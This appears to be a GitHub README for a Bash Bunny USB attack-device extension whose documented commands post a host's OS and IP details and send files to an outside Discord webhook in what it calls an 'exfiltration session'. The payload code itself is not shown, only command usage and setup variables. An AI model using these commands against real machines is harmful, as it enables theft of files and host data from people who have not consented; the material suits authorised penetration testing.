<div align="center">

# Bashbunny

![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
![Quack](https://img.shields.io/badge/Ducky_Script-121011?style=for-the-badge&logo=duck&logoColor=white)

Some works i made for the bashbunny

[Bashbunny](#bashbunny) • [Documentation](#documentation) • [License](#license) . [Changelog](#changelog) . [Support](#support)

<br/>
</div>

> Bashbunny is a pentesting tools, use my payload for this purpose, don't be evil

# Bashbunny
By emulating combinations of trusted USB devices — like gigabit Ethernet, serial, flash storage and keyboards — the Bash Bunny tricks computers into divulging data, exfiltrating documents, installing backdoors and many more exploits.

* [Purchase at Hak5](https://hak5.org/products/bash-bunny)
* [Bash Bunny Forums](https://forums.hak5.org/forum/92-bash-bunny/)
* Discord : [https://hak5.org/discord](https://hak5.org/discord)

# Documentation

>To use this extension, you need to create a webhook on discord and get the webhook id and token
During your setup steps, you need to set the DISCORD_WEBHOOK_ID and DISCORD_WEBHOOK_TOKEN variables

```bash
DISCORD_WEBHOOK_ID="<DISCORD_WEBHOOK_ID>"
DISCORD_WEBHOOK_TOKEN="<DISCORD_WEBHOOK_TOKEN>"
```

### DISCORD INIT

Initialize the exfiltration session by posting an embed message on discord with host information
This command need ```$BB_HOST_OS, $BB_HOST_IP_V4, $BB_HOST_IP_V6, BB_HOST_IP_USER``` variables to be set (Set by default if you use my OSX extension)

## DISCORD SEND MSG

Send a message to discord via webhook

```bash
DISCORD SEND MSG $yourMessage
```

## DISCORD SEND FILE

Send a file to discord via webhook
```bash
DISCORD SEND FILE $yourFilePath
```

# License

# Changelog

v1.0 : 
* :tada: Release on 2023/07/31

# Contributing
A bug ? An idea of feature ? [Fill an issue on github](https://github.com/quentinlamamy/ffmpeg-panda/issues)

# Support
<a href="https://www.buymeacoffee.com/quentinlamamy" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
